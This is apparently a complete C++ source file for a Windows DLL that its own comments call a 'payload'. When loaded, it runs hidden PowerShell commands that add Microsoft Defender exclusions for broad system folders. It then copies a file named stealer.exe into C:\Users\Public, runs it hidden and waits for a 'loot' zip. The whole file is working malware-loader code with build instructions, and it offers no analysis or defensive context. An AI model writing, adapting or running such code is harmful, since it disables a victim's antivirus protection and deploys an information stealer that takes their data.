#include <windows.h>
#include <stdio.h>

// DLL payload:
// 1. Adds Defender exclusions via Add-MpPreference
// 2. Copies stealer.exe to C:\Users\Public\ and runs it
// Compile: cl exclusion_dll.cpp advapi32.lib /LD /Fe:exclusion.dll /EHsc /nologo

#define STEALER_SRC  L"C:\\projects\\test\\stealer.exe"
#define STEALER_DEST L"C:\\Users\\Public\\stealer.exe"
#define LOOT_ZIP     L"C:\\Users\\Public\\stealer_loot.zip"

void AddExclusion(const wchar_t* path) {
    wchar_t cmd[512];
    swprintf_s(cmd, 512,
        L"powershell -WindowStyle Hidden -NonInteractive -Command \"Add-MpPreference -ExclusionPath '%s'\"",
        path);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void RunStealer() {
    // Copy stealer.exe to excluded path
    CopyFileW(STEALER_SRC, STEALER_DEST, FALSE);

    // Run it hidden, wait up to 3 minutes for loot zip
    wchar_t cmd[512];
    swprintf_s(cmd, 512, L"\"%s\"", STEALER_DEST);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 180000); // wait up to 3 min
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

DWORD WINAPI PayloadThread(LPVOID) {
    // Step 1: add exclusions
    AddExclusion(L"C:\\Users");
    AddExclusion(L"C:\\Windows\\Temp");
    AddExclusion(L"C:\\ProgramData");

    // Step 2: drop and run stealer into excluded path
    RunStealer();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        // Spawn thread so DllMain returns immediately (avoids loader lock deadlock)
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}

// Compile: cl exclusion_dll.cpp advapi32.lib /LD /Fe:exclusion.dll /EHsc /nologo
